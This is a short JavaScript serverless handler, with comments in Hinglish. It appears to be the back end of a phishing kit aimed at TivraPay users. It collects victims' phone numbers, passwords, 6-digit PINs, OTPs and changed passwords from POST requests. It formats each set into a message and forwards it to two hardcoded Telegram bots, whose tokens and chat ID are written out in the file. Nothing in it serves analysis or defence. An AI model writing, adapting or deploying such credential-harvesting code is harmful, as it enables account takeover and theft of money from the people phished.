export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const data = req.body;

    // Aapke diye gaye dono Telegram Bots ki details
    const botToken1 = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
    const chatId1 = '6076330929';

    const botToken2 = '8899519634:AAGcr2JLK9HAsX6XXtkwbdp96eioJebTsYY';
    const chatId2 = '6076330929';

    let messageText = '';

    if (data.type === 'login') {
      messageText = `🚀 **TivraPay Login Attempt** 🚀\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n🔑 **Password:** ${data.password}\n━━━━━━━━━━━━━━━━━━━`;
    } else if (data.type === 'pin') {
      messageText = `🛡️ **TivraPay 6-Digit PIN** 🛡️\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n🔒 **PIN:** ${data.pin}\n━━━━━━━━━━━━━━━━━━━`;
    } else if (data.type === 'otp') {
      messageText = `⚡ **TivraPay OTP Submitted** ⚡\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n🔢 **OTP:** ${data.otp}\n━━━━━━━━━━━━━━━━━━━`;
    } else if (data.type === 'modify_req') {
      messageText = `🔄 **TivraPay Modify Request** 🔄\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n🔑 **New Pass:** ${data.password}\n━━━━━━━━━━━━━━━━━━━`;
    } else if (data.type === 'modify') {
      messageText = `✅ **TivraPay Modify OTP Verified** ✅\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n🔑 **New Pass:** ${data.password}\n🔢 **OTP:** ${data.otp}\n━━━━━━━━━━━━━━━━━━━`;
    } else {
      messageText = `🔔 **Data Received:**\n<pre>${JSON.stringify(data, null, 2)}</pre>`;
    }

    // Bot 1 ko request bhejna
    await fetch(`https://api.telegram.org/bot${botToken1}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId1, text: messageText, parse_mode: 'Markdown' })
    });

    // Bot 2 ko request bhejna
    await fetch(`https://api.telegram.org/bot${botToken2}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId2, text: messageText, parse_mode: 'Markdown' })
    });

    return res.status(200).json({ success: true });

  } catch (err) {
    console.error('API Error:', err);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
}
